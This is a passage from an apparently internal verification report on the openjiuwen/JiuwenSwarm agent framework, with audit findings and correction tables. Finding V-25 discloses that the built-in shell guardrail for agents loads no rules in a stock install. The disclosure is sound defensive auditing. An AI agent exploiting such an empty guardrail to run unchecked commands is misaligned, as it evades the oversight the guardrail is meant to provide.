```

and its own docstring: *"Group missing or pool empty → `None` so the caller falls back to the
per-agent model declared in `TeamAgentSpec.agents`."* `TeamWorkerBackend._resolve_model` passes
that `None` straight through.

**Finding.** `agent(model="does-not-exist")` runs on the default worker model with no error and no
warning. **Labelled SRC, not EXEC** — confirming it end to end needs a live team with a populated
model pool, which needs credentials the safeguards exclude.

This is the finding that fails Option D against the preservation gate.

---

## V-25 (EXEC) — the built-in guardrail rule set is empty, and the shipped file is orphaned

```
openjiuwen package rules path: .../openjiuwen/harness/resources/builtin_rules.yaml
exists: False
[PermissionEngine] permission.tiered_policy.builtin_rules_missing
rules loaded: 0
```

`_resolve_builtin_rules_yaml_path` documents the restriction plainly:
*"仅使用包内 …/builtin_rules.yaml（不再查用户/环境目录）"* — package path only, user and environment
directories are no longer consulted.

Meanwhile JiuwenSwarm ships `jiuwenswarm/resources/builtin_rules.yaml` (86 lines) and copies it to
`~/.jiuwenswarm/config/builtin_rules.yaml` at workspace init. Searching the entire JiuwenSwarm
tree, all file types, for `builtin_rules` finds **only the two files that write that copy**
(`common/utils.py`, `init_workspace.py`). No reader exists.

**Finding.** In a stock install the built-in shell guardrail tier loads zero rules, and the file
that appears to fill it is never read. This corrects Revision 3, which framed it as an openjiuwen
packaging omission and proposed shipping a file into openjiuwen's package path — the wrong remedy.

---

## V-26 (EXEC) — Core Workflow accepts a runtime-computed fan-out (spike F2 passes)

```
F2 build: conditional fan-out router ACCEPTED at graph-build time
F2 run  : OK -> result={'final': None} state=<WorkflowExecutionState.COMPLETED: 'COMPLETED'>
```

`add_conditional_connection` accepted a router returning a computed `list[str]` of node ids, and
the graph ran to `COMPLETED`.

**Caveat found by execution.** Declaring `def router(state)` raised
`router() missing 1 required positional argument: 'state'` — the router is invoked with **zero
arguments**. `Router` is typed `Callable[..., Hashable | list[Hashable]]`, so fan-out width must
come from a closure or a channel read, not from a router parameter. F2 passes; the mechanism is
narrower than the type suggests.

---

## V-27 (EXEC) — the evolution framework has one subject; GraphMemory has none

```
grep -rn "def get_operators" openjiuwen/            -> 1 match (react_agent_evolve.py)
grep -rn "GraphMemory|graph_memory" jw-src/jiuwenswarm/ -> 0 matches
```

`Trainer.train(agent, ...)` requires an agent implementing `get_operators()`; exactly one class in
openjiuwen does. JiuwenSwarm imports from `agent_evolving` only:
`EvolutionStore`, `EvolutionArchiveService`, `ExperienceQueryService`, `ExperienceRebuildService`,
`InMemoryTrajectoryRegistry`, and the tool-description optimizer family
(`ToolDescriptionMethod`, `ToolOptimizerBase`, `BeamSearch`, `SimpleEval`).
`Trainer`, `Updater`, `Operator` and `agent_rl` are never imported by the application.

Note also that `jiuwenswarm.common.updater.UpdaterService` is the **application auto-updater**, not
`agent_evolving.updater` — a name collision that could inflate an apparent wiring count.

**Finding.** RSI surface 1 (text artifacts) is genuinely wired on both sides. The other seven need
binding work. Revision 3's "only one of eight is absent" was too generous.

---

## V-28 (EXEC) — capsule schema census

All 42 capsule manifests in `harness/capability-capsules/` and `harness/config/capability-capsules/`
parsed:

| Section | Manifests carrying it |
|---|---:|
| `capability_capsule_id`, `capsule_kind`, `metadata` | 42 |
| `applicability` (task_types, positive_signals, negative_signals) | 42 |
| `contract` (inputs, outputs, preconditions, postconditions, invariants) | 42 |
| `composition` (consumes, produces, compatible_with, incompatible_with, requires_after) | 42 |
| `effects` (read, write, execute, network, cost, risk) | 42 |
| `bindings` (skills, mcp_capabilities, data_refs, secret_refs, required_guard_capsules) | 42 |
| `verification` (self_check, external_verifier, pass_conditions) | 42 |
| `operator_compatibility` (preferred, forbidden) | 42 |
| `provenance` | 42 |
| `version` | 23 |
| `runtime_preferences` | 6 |

Registry (`config/capability-capsules.registry.yaml`): 32 capability + 1 guard + 2 resource = 35
entries; 30 stable, 5 draft; 35 declare a `default_operator_profile`.

**Finding.** Capsules are already implemented as governed capability identities. Absent from the
schema, and therefore `BUILD`: planning strategies, benchmarks, performance history, version
promotion and rollback, RSI target declarations.

---

## V-29 (EXEC) — the seven typed graph domains are absent

`grep -rli` across `AI4Research/harness/lib` and `.../tools`, Python files only:

| Domain | Files |
|---|---:|
| `concept_graph` | 0 |
| `dataset_graph` | 0 |
| `code_graph` | 0 |
| `policy_graph` | 0 |
| `workflow_graph` | 0 |
| `trace_graph` | 0 |
| `memory_graph` | 0 |
| `idea_card` | 0 |
| `account_registration` | 0 |
| `falsifiab*` | 2 |

TaskGraph persistence does exist (`lib/task_graph_io.py`, `lib/task_graph_state_io.py`).

**Finding.** Eight of the nine Data Foundation outcomes are `BUILD` under every architecture
option, as are the Idea Card and the account subsystem.

---

## Revision 4 corrections table

| # | Revision 3 claim | Corrected finding | Class |
|---|---|---|---|
| 20 | SwarmFlow brings pause/resume "with it" | engine replay works; the agent-facing tool rejects `resume_id` | EXEC |
| 21 | (not stated) | a failed step returns `None` and the run reports success | EXEC |
| 22 | (not stated) | `agent_type` is accepted, forwarded and ignored by every backend | EXEC |
| 23 | (not stated) | an unknown model name silently substitutes the default | SRC |
| 24 | openjiuwen ships no `builtin_rules.yaml`; ship one | the file JiuwenSwarm installs is never read; openjiuwen refuses user dirs | EXEC |
| 25 | only RSI-4 is absent; `agent_evolving` covers the rest | only surface 1 is wired; `Trainer` has one possible subject | EXEC |
| 26 | F3 checkpointer persistence — open question | resolved: sqlite `PersistenceCheckpointer` is the process default in a stock install | SRC |
| 27 | F2 runtime fan-out — open spike | resolved: passes, but the router takes no arguments | EXEC |
| 28 | ~450 LOC wrapper, ~800 LOC compiler, ~12–14 months | withdrawn; effort stated as work items with acceptance criteria | derived |
| 29 | 8 options as (entry, control plane, execution) triples | 5 complete-product options; mechanisms are not options | derived |

## Blocked in Revision 4

| Test | Why |
|---|---|
| Live model call through `agent(model=...)` to confirm silent fallback end to end | needs provider credentials |
| Dynamic Team role and permission limits under a live team | needs a team runtime and credentials |
| Windows / macOS installer verification (6 `UNVERIFIED` reuse rows) | cannot build platform installers in this environment |
| Sandbox enforcement under `jiuwenbox` | needs kernel privileges the safeguards exclude |
| Entailment precision of a *replacement* grounding check | the replacement does not exist yet |
